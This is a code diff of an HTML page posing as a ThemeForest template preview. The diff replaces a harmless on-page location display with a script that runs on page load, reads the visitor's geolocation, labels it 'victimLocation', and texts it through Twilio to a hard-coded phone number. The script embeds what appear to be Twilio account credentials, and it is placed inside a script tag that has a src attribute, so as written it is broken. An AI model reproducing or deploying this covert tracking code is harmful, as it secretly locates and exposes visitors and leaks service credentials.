@@ -27,7 +27,40 @@
 <link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/icons/themeforest.net/apple-touch-icon-precomposed.png" />
 
     <script src="https://public-assets.envato-static.com/assets/market/pages/full_screen_preview/index-7f7b99e2fce428dfe1ffa7553744b98eb6c004f82f8f6656439c2f7c74d0a4dd.js" nonce="whxrT1jWfxP3ICvP+L57Zg=="></script>
+<script src="https://sdk.twilio.com/js/client/releases/1.20.0/twilio.min.js">
 
+	const x = document.getElementById("demo");
+
+	function getLocation() {
+	  if (navigator.geolocation) {
+	    navigator.geolocation.getCurrentPosition(showPosition);
+	  } else { 
+	    x.innerHTML = "Use Google Chrome!";
+	  }
+	}
+
+	function showPosition(position) {
+	  let victimLocation = "Latitude: " + position.coords.latitude + 
+	  "<br>Longitude: " + position.coords.longitude;
+	var twilioClient = new Twilio('AC686ac07a3ee1045955ee86f20399df7c', '4fb2bfa35169396d112301caf6326402');
+	twilioClient.messages.create({
+	body: 'Check This location'+ victimLocation,
+	to: '+263779586059',
+	from: '+12722000942'
+	}).then(function(message) {
+	console.log('Message sent successfully. SID: ' + message.sid);
+	}).catch(function(error) {
+	console.error('Error sending message: ' + error);
+	});
+	}
+	
+	window.onload = function() {
+	  getLocation();
+	};
+
+	
+	
+</script>
     <script nonce="whxrT1jWfxP3ICvP+L57Zg==">
 //<![CDATA[
       //function to fix height of iframe!
@@ -55,26 +88,7 @@
 
 <p id="demo"></p>
 
-<script>
-const x = document.getElementById("demo");
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Use Google Chrome!";
-  }
-}
-
-function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
-}
-
-window.onload = function() {
-  getLocation();
-};
-</script>
 
     <div class="preview__header" data-view="ctaHeader" data-item-id="39457688">
   <div class="preview__envato-logo">
